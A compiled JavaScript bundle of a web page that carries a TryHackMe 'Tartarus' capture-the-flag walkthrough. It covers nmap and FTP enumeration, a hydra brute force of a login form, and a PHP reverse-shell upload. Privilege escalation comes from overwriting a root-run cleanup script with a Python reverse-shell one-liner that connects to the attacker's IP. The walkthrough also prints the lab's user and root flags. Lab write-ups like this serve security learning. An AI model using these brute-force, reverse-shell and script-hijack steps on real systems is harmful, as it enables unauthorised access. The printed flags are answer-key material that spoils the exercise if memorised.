"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[7151],{3905:(t,e,n)=>{n.d(e,{Zo:()=>l,kt:()=>f});var r=n(67294);function s(t,e,n){return e in t?Object.defineProperty(t,e,{value:n,enumerable:!0,configurable:!0,writable:!0}):t[e]=n,t}function a(t,e){var n=Object.keys(t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(t);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(t,e).enumerable}))),n.push.apply(n,r)}return n}function o(t){for(var e=1;e<arguments.length;e++){var n=null!=arguments[e]?arguments[e]:{};e%2?a(Object(n),!0).forEach((function(e){s(t,e,n[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(t,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(e){Object.defineProperty(t,e,Object.getOwnPropertyDescriptor(n,e))}))}return t}function p(t,e){if(null==t)return{};var n,r,s=function(t,e){if(null==t)return{};var n,r,s={},a=Object.keys(t);for(r=0;r<a.length;r++)n=a[r],e.indexOf(n)>=0||(s[n]=t[n]);return s}(t,e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(t);for(r=0;r<a.length;r++)n=a[r],e.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(t,n)&&(s[n]=t[n])}return s}var i=r.createContext({}),c=function(t){var e=r.useContext(i),n=e;return t&&(n="function"==typeof t?t(e):o(o({},e),t)),n},l=function(t){var e=c(t.components);return r.createElement(i.Provider,{value:e},t.children)},u="mdxType",d={inlineCode:"code",wrapper:function(t){var e=t.children;return r.createElement(r.Fragment,{},e)}},m=r.forwardRef((function(t,e){var n=t.components,s=t.mdxType,a=t.originalType,i=t.parentName,l=p(t,["components","mdxType","originalType","parentName"]),u=c(n),m=s,f=u["".concat(i,".").concat(m)]||u[m]||d[m]||a;return n?r.createElement(f,o(o({ref:e},l),{},{components:n})):r.createElement(f,o({ref:e},l))}));function f(t,e){var n=arguments,s=e&&e.mdxType;if("string"==typeof t||s){var a=n.length,o=new Array(a);o[0]=m;var p={};for(var i in e)hasOwnProperty.call(e,i)&&(p[i]=e[i]);p.originalType=t,p[u]="string"==typeof t?t:s,o[1]=p;for(var c=2;c<a;c++)o[c]=n[c];return r.createElement.apply(null,o)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},86779:(t,e,n)=>{n.r(e),n.d(e,{assets:()=>i,contentTitle:()=>o,default:()=>d,frontMatter:()=>a,metadata:()=>p,toc:()=>c});var r=n(87462),s=(n(67294),n(3905));const a={},o="Tartarus",p={unversionedId:"Tryhackme/Tartarus/Tartarus",id:"Tryhackme/Tartarus/Tartarus",title:"Tartarus",description:"This is a beginner box based on simple enumeration of services and basic privilege escalation techniques. Based Jake",source:"@site/writeups/Tryhackme/Tartarus/Tartarus.md",sourceDirName:"Tryhackme/Tartarus",slug:"/Tryhackme/Tartarus/",permalink:"/writeups/Tryhackme/Tartarus/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"symfonos6",permalink:"/writeups/Tryhackme/Symfonos6/"},next:{title:"Tempus Fugit Durius",permalink:"/writeups/Tryhackme/Tempus Fugit Durius/"}},i={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Tartarus",id:"task-1-tartarus",level:2}],l={toc:c},u="wrapper";function d(t){let{components:e,...n}=t;return(0,s.kt)(u,(0,r.Z)({},l,n,{components:e,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"tartarus"},"Tartarus"),(0,s.kt)("p",null,"This is a beginner box based on simple enumeration of services and basic privilege escalation techniques. Based Jake"),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/tartaraus"},"Tartarus")),(0,s.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,s.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,s.kt)("li",{parentName:"ul"},"FTP Enumeration"),(0,s.kt)("li",{parentName:"ul"},"Brute Forcing (http-post-form)"),(0,s.kt)("li",{parentName:"ul"},"Exploitation Upload"),(0,s.kt)("li",{parentName:"ul"},"Security Misconfiguration")),(0,s.kt)("hr",null),(0,s.kt)("h2",{id:"task-1-tartarus"},"Task 1 Tartarus"),(0,s.kt)("p",null,"User and Root Flag"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Tartarus$ sudo nmap -A -sS -sC -sV -O 10.10.205.15\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 11:20 CEST\nNmap scan report for 10.10.205.15\nHost is up (0.037s latency).\nNot shown: 997 closed ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.8.106.222\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 1\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)\n|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)\n|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/14%OT=21%CT=1%CU=44755%PV=Y%DS=2%DC=T%G=Y%TM=5F86C3\nOS:10%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10D%TI=Z%II=I%TS=8)SEQ(SP=\nOS:106%GCD=1%ISR=10D%TI=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW7%O2=M508ST11NW7%\nOS:O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST11NW7%O6=M508ST11)WIN(W1=68DF%W2\nOS:=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O=M508NNS\nOS:NW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%\nOS:DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%\nOS:O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%\nOS:W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%\nOS:RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)\n\nNetwork Distance: 2 hops\nService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1723/tcp)\nHOP RTT      ADDRESS\n1   36.30 ms 10.8.0.1\n2   36.55 ms 10.10.205.15\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 25.52 seconds\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Tartarus$ ftp 10.10.205.15\nConnected to 10.10.205.15.\n220 (vsFTPd 3.0.3)\nName (10.10.205.15:kali): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .\ndrwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..\ndrwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...\n-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt\n226 Directory send OK.\nftp> cd ...\n250 Directory successfully changed.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .\ndrwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..\ndrwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ...\n226 Directory send OK.\nftp> cd ...\n250 Directory successfully changed.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 .\ndrwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..\n-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt\n226 Directory send OK.\nftp>\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Tartarus$ cat yougotgoodeyes.txt\n/sUp3r-s3cr3t\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"http://10.10.205.15/sUp3r-s3cr3t/"},"http://10.10.205.15/sUp3r-s3cr3t/")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"http://10.10.205.15/robots.txt"},"http://10.10.205.15/robots.txt")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"User-Agent: *\nDisallow : /admin-dir\n\nI told d4rckh we should hide our things deep.\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"http://10.10.205.15/admin-dir/"},"http://10.10.205.15/admin-dir/")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Tartarus$ hydra -L userid -P credentials.txt 10.10.205.15 http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect"\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-14 11:28:50\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 1313 login tries (l:13/p:101), ~83 tries per task\n[DATA] attacking http-post-form://10.10.205.15:80/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect\n[80][http-post-form] host: 10.10.205.15   login: enox   password: P@ssword1234\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-14 11:29:23\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Tartarus$ sudo /opt/dirsearch/dirsearch.py -u http://10.10.205.15/sUp3r-s3cr3t/ -E -w /usr/share/wordlists/dirb/common.txt\n[sudo] password for kali:\n\n  _|. _ _  _  _  _ _|_    v0.4.0\n (_||| _) (/_(_|| (_| )\n\nExtensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 4613\n\nError Log: /opt/dirsearch/logs/errors-20-10-14_11-31-47.log\n\nTarget: http://10.10.205.15/sUp3r-s3cr3t/\n\nOutput File: /opt/dirsearch/reports/10.10.205.15/sUp3r-s3cr3t_20-10-14_11-31-47.txt\n\n[11:31:47] Starting:\n[11:31:54] 301 -  326B  - /sUp3r-s3cr3t/images  ->  http://10.10.205.15/sUp3r-s3cr3t/images/\n[11:31:54] 200 -  732B  - /sUp3r-s3cr3t/index.html\n\nTask Completed\n")),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"http://10.10.205.15/sUp3r-s3cr3t/images/uploads/php-reverse-shell.php"},"http://10.10.205.15/sUp3r-s3cr3t/images/uploads/php-reverse-shell.php")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Tartarus$ nc -nlvp 9001\nlistening on [any] 9001 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.205.15] 44160\nLinux ubuntu-xenial 4.4.0-184-generic #214-Ubuntu SMP Thu Jun 4 10:14:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n 09:32:24 up 12 min,  0 users,  load average: 0.00, 0.04, 0.04\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/bin/sh: 0: can't access tty; job control turned off\n$ id\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n$ cd /home\n$ ls\ncleanup\nd4rckh\nthirtytwo\n$ cd d4rckh\n$ ls\ncleanup.py\nuser.txt\n$ cat user.txt\n0f7dbb2243e692e3ad222bc4eff8521f\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ cat cleanup.py\n# -*- coding: utf-8 -*-\n#!/usr/bin/env python\nimport os\nimport sys\ntry:\n        os.system('rm -r /home/cleanup/* ')\nexcept:\n        sys.exit()\n$\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'printf \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\' > cleanup.py\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},'$ printf \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\' > cleanup.py\n$ cat cleanup.py\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.106.222",9002));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);\n$ ./cleanup.py\n')),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Tartarus$ nc -nlvp 9002\nlistening on [any] 9002 ...\nconnect to [10.8.106.222] from (UNKNOWN) [10.10.205.15] 51532\nbash: cannot set terminal process group (1711): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@ubuntu-xenial:~# id\nid\nuid=0(root) gid=0(root) groups=0(root)\nroot@ubuntu-xenial:~# ls\nls\nroot.txt\nroot@ubuntu-xenial:~# cat root.txt\ncat root.txt\n7e055812184a5fa5109d5db5c7eda7cd\n")),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"User Flag")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"0f7dbb2243e692e3ad222bc4eff8521f")),(0,s.kt)("ol",{start:2},(0,s.kt)("li",{parentName:"ol"},"Root Flag")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"7e055812184a5fa5109d5db5c7eda7cd")))}d.isMDXComponent=!0}}]);